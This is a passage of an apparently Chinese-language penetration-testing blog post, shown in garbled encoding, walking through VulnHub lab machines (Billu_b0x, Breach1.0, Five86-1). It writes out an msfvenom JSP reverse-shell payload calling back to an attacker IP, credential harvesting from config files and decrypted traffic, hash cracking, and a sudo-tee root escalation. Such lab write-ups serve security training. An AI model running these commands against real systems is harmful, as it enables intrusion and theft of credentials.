<p>å¯¹äº root çš„è¯ï¼Œè¿˜æœ‰ä¸€ä¸ªç‚¹ï¼Œå°±æ˜¯ phpmyadmin çš„é…ç½®æ–‡ä»¶è¯»å–ï¼š<code>/var/www/phpmy/config.inc.php</code>ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;roottoor&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æ‹¿åˆ° root å¯†ç ã€‚</p>
<hr>
<p>æ³¨ï¼š</p>
<ul>
<li>ææƒæ–¹æ³•å¯ä»¥å¤šå…³æ³¨ä¸»è¦çš„é…ç½®æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥æ–‡ä»¶ã€ç”¨æˆ·çš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨Ubuntuå·²çŸ¥æ¼æ´æœ¬åœ°ææƒ</li>
<li>MySQL æœ‰å¯èƒ½è¢«é«˜çº¿ç¨‹ç›®å½•æš´ç ´å’Œæ³¨å…¥å®•æœº</li>
</ul>
<h2 id="Breach1-0"><a href="#Breach1-0" class="headerlink" title="Breach1.0"></a>Breach1.0</h2><p>æ³¨ï¼š</p>
<p>VM è™šæœºé…ç½®æœ‰é™æ€IPåœ°å€ï¼ˆ192.168.110.140ï¼‰ï¼Œéœ€è¦å°†è™šæ‹Ÿæœºç½‘å¡è®¾ç½®ä¸º host-only æ–¹å¼ç»„ç½‘ã€‚</p>
<p>å…·ä½“æ–¹æ³•ï¼šç‚¹å¼€ç½‘ç»œé€‚é…å™¨ï¼Œé…ç½® vm net1 -&gt; å±æ€§ -&gt; TCP/IPV4 -&gt; ipï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.110.1</span><br><span class="line">255.255.255.0</span><br><span class="line">192.168.110.254</span><br></pre></td></tr></table></figure>

<hr>
<p>Nmap æ‰«ä¸€ä¸‹å‘ç°å®ƒæŠŠæ‰€æœ‰ç«¯å£éƒ½å¼€æ”¾äº†ï¼ˆå¯ä»¥ç”¨ -sF ç»•è¿‡é˜²æ¢æµ‹ç­–ç•¥ï¼‰â€¦â€¦æˆ‘ä»¬ç›´æ¥è®¿é—® httpã€‚åœ¨ <a target="_blank" rel="noopener" href="http://192.168.110.140/impresscms/user.php">http://192.168.110.140/impresscms/user.php</a> å¯ä»¥ç™»å½• cmsã€‚</p>
<p><img src="https://i.loli.net/2021/05/11/mdCOWsfSDtXPM7F.png"></p>
<p>åœ¨ index æ³¨é‡Šä¸­æ‰¾åˆ°ä¸€æ®µ Base64ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo</span><br><span class="line">cGdpYmJvbnM6ZGFtbml0ZmVlbCRnb29kdG9iZWFnYW5nJHRh</span><br><span class="line">pgibbons:damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure>

<p>è·å¾—ç”¨æˆ·åä¸å¯†ç ï¼Œç™»å½•ã€‚</p>
<p>Inbox ä¸­æœ‰ä¸‰å°é‚®ä»¶ï¼Œåœ¨ç¬¬ä¸‰å°é‚®ä»¶ä¸­å‘ç° <a target="_blank" rel="noopener" href="http://192.168.110.140/.keystore">http://192.168.110.140/.keystore</a> å­˜åœ¨ä¸€ä¸ª SSL certificateã€‚View Account ä¸­çš„ Content æœ‰ä¸€ä¸ª SSL implementation test captureï¼Œå‘ç°æµé‡åŒ… <a target="_blank" rel="noopener" href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap%EF%BC%8C%E5%90%8C%E6%97%B6%E8%8E%B7%E5%8F%96%E5%88%B0%E6%8F%90%E7%A4%BA%EF%BC%9A%60They">http://192.168.110.140/impresscms/_SSL_test_phase1.pcapï¼ŒåŒæ—¶è·å–åˆ°æç¤ºï¼š`They</a> told me the alias, storepassword and keypassword are all set to â€˜tomcatâ€™.`ï¼Œæç¤ºäº†åˆ«åã€å­˜å‚¨å¯†ç å’Œå¯†é’¥å¯†ç éƒ½è®¾ç½®ä¸º tomcatã€‚</p>
<p>åˆ©ç”¨ JDK çš„ keytool.exe è§£å¯†ï¼Œé¦–å…ˆæŸ¥çœ‹ keystore ä¸­çš„æ‰€æœ‰è¯ä¹¦ï¼š</p>
<p><code> keytool -list -keystore ./keystore</code>ï¼šï¼ˆå¯†é’¥åº“å£ä»¤ tomcatï¼‰</p>
<p><img src="https://i.loli.net/2021/05/11/GXZI1fwaWP4piFN.png"></p>
<p>ä»å¯†é’¥åº“ä¸­å¯¼å‡º .p12 è¯ä¹¦ï¼Œå°† keystore æ‹·è´åˆ° keytool ç›®å½•ï¼Œå¯¼å‡ºåä¸º tomcatkeystore.p12 çš„è¯ä¹¦ï¼š</p>
<p><code>keytool -importkeystore -srckeystore ./keystore -destkeystore tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat</code></p>
<p><img src="https://i.loli.net/2021/05/11/jTKaLHUbJDmrRh3.png"></p>
<p>ç„¶åå°† .p12 è¯ä¹¦å¯¼å…¥æ‰“å¼€äº†æµé‡åŒ…çš„ WireSharkï¼šç¼–è¾‘ -&gt; é¦–é€‰é¡¹ -&gt; Protocols -&gt; TLS -&gt; EDITï¼ˆæœ€æ–°ç‰ˆ WireShark å·²ç»æŠŠ SSLæ”¹ä¸º TLSï¼Œå…¶å® SSL/TLS éƒ½å·²ç»Ÿç§°é€šä¿¡åŠ å¯†åè®®ï¼Œæ‰€ä»¥å°±æ”¾ä¸€å—äº†ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.110.140 8443 http ç‚¹å‡»é€‰æ‹©è¯ä¹¦æ–‡ä»¶ è¾“å…¥å¯†ç tomcat</span><br></pre></td></tr></table></figure>

<p>å› ä¸º <em>8443 æ˜¯ tomcat æ‰“å¼€ SSL çš„æ–‡æœ¬æœåŠ¡çš„é»˜è®¤ç«¯å£</em></p>
<p>è‡³æ­¤æˆåŠŸè§£å¯†æµé‡ï¼Œåˆ†æå¯ä»¥å‘ç°å…¶ä¸­å­˜åœ¨ jsp æœ¨é©¬çš„æµé‡ï¼Œä»¥åŠé‡‡ç”¨ http basic è®¤è¯ç™»å½•åå°çš„æµé‡ï¼Œç»è¿‡ Base64 è§£å¯†åå¾—åˆ° tomcat ç”¨æˆ·ååŠå¯†ç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat:Tt\5D8F(#!*u&#x3D;G)4m7zB</span><br></pre></td></tr></table></figure>

<p>è®¿é—® <a target="_blank" rel="noopener" href="https://192.168.110.140:8443/_M@nag3Me/html%EF%BC%8C%E5%A6%82%E6%9E%9C%E7%99%BB%E5%BD%95%E4%B8%8D%E6%88%90%E5%8A%9F%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95">https://192.168.110.140:8443/_M@nag3Me/htmlï¼Œå¦‚æœç™»å½•ä¸æˆåŠŸå¯ä»¥å°è¯•</a> BP å‘åŒ…ï¼ˆå› ä¸ºæœ€æ–°ç‰ˆæµè§ˆå™¨å¦‚æœæ²¡æœ‰ç›¸åº”è¯ä¹¦ä¼šæœ‰é™åˆ¶ï¼Œä½†æ˜¯ BP ä¸­æœ‰å„ç§è¯ä¹¦ï¼ŒæŒ‚ä¸ª BP ä»£ç†å°±ä¸Šäº†ï¼‰</p>
<p><img src="https://i.loli.net/2021/05/11/CszhpEtxGVRDdNH.png"></p>
<p>å¯ä»¥ä¸Šä¼ åŒ…å« jsp é©¬çš„ war åŒ…ï¼Œåˆ©ç”¨ msf ç›´æ¥ç”Ÿæˆï¼š<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.100 LPORT=2333 -f war &gt; shell.war</code>ï¼Œåœ¨ msf ä¸Šè®¾ç½®ä¸€ä¸ªç›‘å¬ï¼Œç„¶åç›´æ¥ä¼ é©¬è®¿é—®ï¼šï¼ˆå¼¹å›æ¥çš„ shell è¦ç­‰å·¨ JB ä¹…ï¼ŒğŸ‘´æ˜¯è¦æ”¾å¼ƒçš„æ—¶å€™çªç„¶å‘ç°ï¼Œæ¬¸ï¼Œæ€ä¹ˆ connect äº†ï¼‰</p>
<p><img src="https://i.loli.net/2021/05/13/rltALPbhEco47BK.png"></p>
<p><img src="https://i.loli.net/2021/05/13/dZcur9L3xApOGPj.jpg" alt="~_G_QMR9_8RRP1MXL_V@N_3.jpg"></p>
<p>æ­¤æ—¶æ‹¿åˆ°äº† shell äº†ï¼Œå¯ä»¥ç”¨ python æ¥è·å–äº¤äº’å¼ shellï¼š<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; </code></p>
<p><img src="https://i.loli.net/2021/05/13/LDtSI2FRCoq4XEH.png"></p>
<p>æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿç”¨æˆ·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">libuuid:x:100:101::&#x2F;var&#x2F;lib&#x2F;libuuid:</span><br><span class="line">syslog:x:101:104::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:102:106::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">landscape:x:103:109::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;bin&#x2F;false</span><br><span class="line">milton:x:1000:1000:Milton_Waddams,,,:&#x2F;home&#x2F;milton:&#x2F;bin&#x2F;bash</span><br><span class="line">tomcat6:x:104:112::&#x2F;usr&#x2F;share&#x2F;tomcat6:&#x2F;bin&#x2F;false</span><br><span class="line">colord:x:105:114:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:106:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">blumbergh:x:1001:1001:Bill Lumbergh,,,:&#x2F;home&#x2F;blumbergh:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸¤ä¸ªç”¨æˆ·å¾ˆæœ‰æ„æ€ï¼šmilton &amp; blumberghï¼ˆå®ƒä¿©éƒ½æœ‰ /bin/bashï¼‰ã€‚å¯ä»¥åœ¨ /var/www/5446 ä¸­å‘ç°ä¸¤ä¸ªæœ‰è¶£çš„ php æ–‡ä»¶ï¼š</p>
<p><img src="https://i.loli.net/2021/05/13/QHYwarZ3W9FDOJm.png"></p>
<p>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰æ•°æ®åº“ç”¨æˆ· root çš„ä¿¡æ¯ï¼š</p>
<p><img src="https://i.loli.net/2021/05/13/rCIt6ZE58MqimnY.png"></p>
<p>å¯†ç ä¸ºç©ºï¼Œæˆ‘ä»¬ç›´æ¥ç”¨ mysql -uroot -p å°±å¯ä»¥ç™»å…¥ï¼š</p>
<p><img src="https://i.loli.net/2021/05/13/bZHUfsgpeAzFi47.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use mysql;</span><br><span class="line">select user,password from user;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç”¨æˆ·å¯†ç è¡¨ï¼š</p>
<table>
<thead>
<tr>
<th>user</th>
<th>password</th>
</tr>
</thead>
<tbody><tr>
<td>root</td>
<td></td>
</tr>
<tr>
<td>milton</td>
<td>6450d89bd3aff1d893b85d3ad65d2ec2</td>
</tr>
<tr>
<td>root</td>
<td></td>
</tr>
<tr>
<td>root</td>
<td></td>
</tr>
<tr>
<td>debian-sys-maint</td>
<td>*A9523939F1B2F3E72A4306C34F225ACF09590878</td>
</tr>
</tbody></table>
<p>å¾—åˆ° milton çš„å¯†ç  hash ä¸º 6450d89bd3aff1d893b85d3ad65d2ec2ï¼Œç»è§£å¯†å¾—åˆ°ï¼š<code>thelaststraw</code>ï¼Œå½³äºâ€¦ <code>su milton</code>ï¼Œå†è¾“å…¥å¯†ç ï¼Œè¿™æ ·å°±ææƒåˆ° milton äº†ã€‚åœ¨å†å²å‘½ä»¤ä¸­å‘ç°æœ‰ su åˆ° blumbergh ç”¨æˆ·ï¼Œå¯»æ‰¾ blumbergh ç”¨æˆ·å¯†ç ã€‚</p>
<p>åœ¨ <a target="_blank" rel="noopener" href="http://192.168.110.140/images/bill.png">http://192.168.110.140/images/bill.png</a> çš„ exif ä¸­å­˜åœ¨æŸç¥ç§˜å­—ç¬¦ä¸² <code>coffeestains</code>ï¼Œå°è¯•ä½œä¸º blumbergh ç”¨æˆ·å¯†ç ç™»å½•ã€‚æˆåŠŸç™»å½•ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æƒé™ï¼š</p>
<p><img src="https://i.loli.net/2021/05/13/iEvmcHzBZ6uaL1I.png"></p>
<p><img src="https://i.loli.net/2021/05/13/4Bw1tUfXdkmvNQ6.png"></p>
<p>å¯ä»¥å‘ç° <code>/usr/share/cleanup/tidyup.sh</code> æ²¡æœ‰å†™å…¥æƒé™ï¼Œä½†æ˜¯å¯ä»¥ç”¨ root æƒé™æ‰§è¡Œ tee å‘½ä»¤æŠŠåå¼¹ shell å‘½ä»¤å†™å…¥ç„¶åæ‰§è¡Œã€‚ï¼ˆteeå‘½ä»¤ç”¨äºè¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶ï¼‰</p>
<p>çœ‹ä¸€ä¸‹ tidyup.sh é‡Œé¢æ˜¯å•¥å§ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/lib/tomcat6/webapps &amp;&amp; find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf</span><br></pre></td></tr></table></figure>

<p>æ¯éš”ä¸‰åˆ†é’Ÿå°±ä¼šæ¸…ç† webapps ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œæ‰€ä»¥ä¹‹å‰ä¼ çš„ğŸå¦‚æœä¸åå¼¹ shell çš„è¯å¾ˆå¿«å°±ä¼šè¢«åˆ æ‰ã€‚</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯å†™å…¥å‘½ä»¤å¼¹ shell äº†ï¼šï¼ˆåŒæ—¶å¦å¤–å¼€ä¸€ä¸ª terminal æ¥æ¥å— shellï¼‰</p>
<p><img src="https://i.loli.net/2021/05/13/7PcaTGvr3MXZBwm.png"></p>
<p><img src="https://i.loli.net/2021/05/13/FvfjmRVUbPzk5WX.png"></p>
<p>å¯ä»¥å‘ç°æˆ‘ä»¬å·²ç»ææƒè‡³äº† rootï¼Œåé¢ flag ä»€ä¹ˆçš„ä¾¿ä¸é‡è¦äº†ã€‚</p>
<h2 id="Five86-1"><a href="#Five86-1" class="headerlink" title="Five86-1"></a>Five86-1</h2><p>Nmap æ‰«ä¸€ä¸‹ã€‚</p>
<p><img src="https://i.loli.net/2021/05/13/WTVzvbgFcrksuU2.png" alt="U_MH_Q9JAM05PC__GW77DJ5.png"></p>
<p>10000 ç«¯å£å¼€äº†ä¸ª <code>Webmin httpd 1.920</code>ï¼Œå¯ä»¥æœä¸€ä¸‹æœ‰æ—  expã€‚ï¼ˆWebmin æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ UNIX web ç®¡ç†ï¼‰</p>
<p><img src="https://i.loli.net/2021/05/14/x4BjoNLF6eKCp1v.png"></p>
<p>robots.txt é‡Œå‘ç° /ona è·¯ç”±ï¼Œè®¿é—®ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ OpenNetAdminï¼Œæœä¸€ä¸‹æœ‰æ—  expï¼š</p>
<p><img src="https://i.loli.net/2021/05/14/XfprCJUjvYn7TIK.png"></p>
<p><img src="https://i.loli.net/2021/05/14/HuPBYdxZX9LylKs.png"></p>
<p>æŠŠ exp å¤åˆ¶å‡ºæ¥ä¸¢åˆ° msf é‡Œé¢ï¼Œç›´æ¥æ‰“ä¸€å‘ï¼š</p>
<p><code>cp /usr/share/exploitdb/exploits/php/webapps/47772.rb /usr/share/metasploit-framework/modules/exploits</code></p>
<p><img src="https://i.loli.net/2021/05/14/IFRLAYWqaoGtS8v.png" alt="2VVE3EMW08WLWS__PGPW_Z9.png"></p>
<p><img src="https://i.loli.net/2021/05/14/vHzlJdCqMFou97O.jpg"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Me-and-My-Girlfriend-1"><span class="toc-number">1.</span> <span class="toc-text">Me and My Girlfriend: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Billu-b0x"><span class="toc-number">2.</span> <span class="toc-text">Billu_b0x</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Breach1-0"><span class="toc-number">3.</span> <span class="toc-text">Breach1.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Five86-1"><span class="toc-number">4.</span> <span class="toc-text">Five86-1</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&text=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&title=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&is_video=false&description=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…&body=Check out this article: http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&title=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&title=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&title=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&title=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&name=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&t=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021
    Du1
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
        
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
         <span id="busuanzi_container_site_pv">æœ¬ç«™æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡</span>
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.2/css/all.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.bootcdn.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
